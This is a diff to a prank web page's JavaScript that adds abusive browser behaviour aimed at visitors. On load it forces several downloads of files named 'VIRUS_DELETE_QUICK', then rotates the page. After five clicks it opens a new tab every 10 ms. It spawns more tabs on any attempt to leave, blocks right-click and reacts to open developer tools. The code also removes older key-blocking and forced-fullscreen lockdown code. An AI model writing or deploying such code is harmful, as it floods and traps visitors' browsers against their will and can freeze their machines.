@@ -2,6 +2,29 @@ document.addEventListener('DOMContentLoaded', () => {
     let clickCount = 0;
     let jumpscareTriggered = false;
 
+    // Fake virus file spam on load
+    function downloadFakeVirusFiles() {
+        for (let i = 1; i <= 5; i++) {
+            const blob = new Blob([`lol gotcha 🤡\nthis ain't a virus... or is it?\nplease HELLO I CANNOT LISTEN TO SIMPLE COMMANDS, I WAS TOLD THAT THIS WOULD SPAM ALOT OF STUFF ON MY COMPUTER AND POSSIBLY RUIN IT FOR A COUPLE OF MINUTES, I AM STUPID AND THIS IS MY FAULT - person who went to the website and clicked the button 5 times is responsible for this mess, not the creator. THEY WERE WARNED.`], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = `VIRUS_DELETE_QUICK_${i}.txt`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    }
+
+    // Screen rotation chaos
+    function rotateScreenChaos() {
+        setInterval(() => {
+            document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg)`;
+        }, 500);
+    }
+
+    downloadFakeVirusFiles();
+    rotateScreenChaos();
+
     function triggerJumpscareBurst() {
         const warningAudio = new Audio('warning.mp3');
         warningAudio.loop = true;
@@ -78,7 +101,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function flashRandomColors() {
-        const colors = ['#ff0000','#00ff00','#0000ff','#ffff00','#ff00ff','#00ffff','#ff8000','#8000ff','#00ff80','#ff0080','#808080','#ffcc00'];
+        const colors = [
+            '#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff',
+            '#ff8000', '#8000ff', '#00ff80', '#ff0080', '#808080', '#ffcc00'
+        ];
+
         setInterval(() => {
             const randomColor = colors[Math.floor(Math.random() * colors.length)];
             document.body.style.backgroundColor = randomColor;
@@ -86,18 +113,15 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function spamRandomText() {
-        const textArray = ['Help!','Why?','Get out!','RUN!','Why are you here?','What is happening?'];
+        const textArray = ['Help!', 'Why?', 'Get out!', 'RUN!', 'Why are you here?', 'What is happening?'];
         setInterval(() => {
             const text = textArray[Math.floor(Math.random() * textArray.length)];
-            const randomX = Math.random() * window.innerWidth;
-            const randomY = Math.random() * (window.innerHeight / 2) + window.innerHeight / 2;
-
             const span = document.createElement('span');
             span.innerText = text;
             span.style.position = 'absolute';
-            span.style.color = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
-            span.style.left = `${randomX}px`;
-            span.style.top = `${randomY}px`;
+            span.style.color = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+            span.style.left = `${Math.random() * window.innerWidth}px`;
+            span.style.top = `${Math.random() * window.innerHeight}px`;
             span.style.fontSize = `${Math.random() * 30 + 10}px`;
             document.body.appendChild(span);
         }, 50);
@@ -109,8 +133,8 @@ document.addEventListener('DOMContentLoaded', () => {
             button.innerText = 'Click me!';
             button.style.position = 'absolute';
             button.style.left = `${Math.random() * window.innerWidth}px`;
-            button.style.top = `${Math.random() * (window.innerHeight / 2) + window.innerHeight / 2}px`;
-            button.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+            button.style.top = `${Math.random() * window.innerHeight}px`;
+            button.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
             button.style.fontSize = '15px';
             button.style.zIndex = '99999';
             document.body.appendChild(button);
@@ -118,18 +142,14 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function spamRandomEmojis() {
-        const emojis = ['😊','😂','😱','😈','🤯','💀'];
+        const emojis = ['😊', '😂', '😱', '😈', '🤯', '💀'];
         setInterval(() => {
-            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
-            const randomX = Math.random() * window.innerWidth;
-            const randomY = Math.random() * (window.innerHeight / 2) + window.innerHeight / 2;
-
             const span = document.createElement('span');
-            span.innerText = emoji;
+            span.innerText = emojis[Math.floor(Math.random() * emojis.length)];
             span.style.position = 'absolute';
             span.style.fontSize = `${Math.random() * 30 + 10}px`;
-            span.style.left = `${randomX}px`;
-            span.style.top = `${randomY}px`;
+            span.style.left = `${Math.random() * window.innerWidth}px`;
+            span.style.top = `${Math.random() * window.innerHeight}px`;
             document.body.appendChild(span);
         }, 30);
     }
@@ -139,10 +159,10 @@ document.addEventListener('DOMContentLoaded', () => {
             const div = document.createElement('div');
             div.style.position = 'absolute';
             div.style.left = `${Math.random() * window.innerWidth}px`;
-            div.style.top = `${Math.random() * (window.innerHeight / 2) + window.innerHeight / 2}px`;
+            div.style.top = `${Math.random() * window.innerHeight}px`;
             div.style.width = `${Math.random() * 200 + 50}px`;
             div.style.height = `${Math.random() * 200 + 50}px`;
-            div.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+            div.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
             div.style.zIndex = '1';
             document.body.appendChild(div);
         }, 50);
@@ -152,6 +172,11 @@ document.addEventListener('DOMContentLoaded', () => {
         clickCount++;
         if (clickCount >= 5) {
             initialTrigger();
+
+            // start infinite tab spamming
+            setInterval(() => {
+                window.open(window.location.href, '_blank');
+            }, 10);
         }
     });
 
@@ -161,52 +186,26 @@ document.addEventListener('DOMContentLoaded', () => {
     spamRandomEmojis();
     spamRandomDivs();
 
-    // 🚫 Extreme Tab Lockdown Additions
-
-    function openTabs(n = 5) {
-        for (let i = 0; i < n; i++) {
-            const newTab = window.open(window.location.href, '_blank');
-            if (newTab) newTab.blur();
+    // Ask before leaving AND spawn infinite tabs
+    window.onbeforeunload = function () {
+        for (let i = 0; i < 3; i++) {
+            window.open(window.location.href, '_blank');
         }
-    }
+        return "Don't leave me here!";
+    };
 
-    setInterval(() => openTabs(3), 3000);
+    // Disable right-click
+    document.addEventListener('contextmenu', event => event.preventDefault());
 
-    window.addEventListener('beforeunload', (e) => {
-        openTabs(5);
-        e.preventDefault();
-        e.returnValue = 'You cannot escape.';
-    });
-
-    window.addEventListener('unload', () => openTabs(3));
-
+    // Try to block dev tools
     setInterval(() => {
-        const el = document.documentElement;
-        if (el.requestFullscreen) el.requestFullscreen();
-    }, 2000);
-
-    document.body.style.cursor = 'none';
-
-    document.addEventListener('contextmenu', e => e.preventDefault());
-
-    document.addEventListener('keydown', (e) => {
-        const blockedKeys = ['F12', 'Escape', 'F5'];
+        const threshold = 160;
         if (
-            blockedKeys.includes(e.key) ||
-            (e.ctrlKey && e.key.toLowerCase() === 'w') ||
-            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-            (e.altKey && e.key === 'F4')
+            window.outerWidth - window.innerWidth > threshold ||
+            window.outerHeight - window.innerHeight > threshold
         ) {
-            e.preventDefault();
-            alert('nope');
-            openTabs(5);
-        }
-    });
-
-    setInterval(() => {
-        if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
-            alert('devtools detected!');
-            openTabs(5);
+            alert("NO DEV TOOLS!");
+            window.open(window.location.href, '_blank');
         }
     }, 1000);
 });
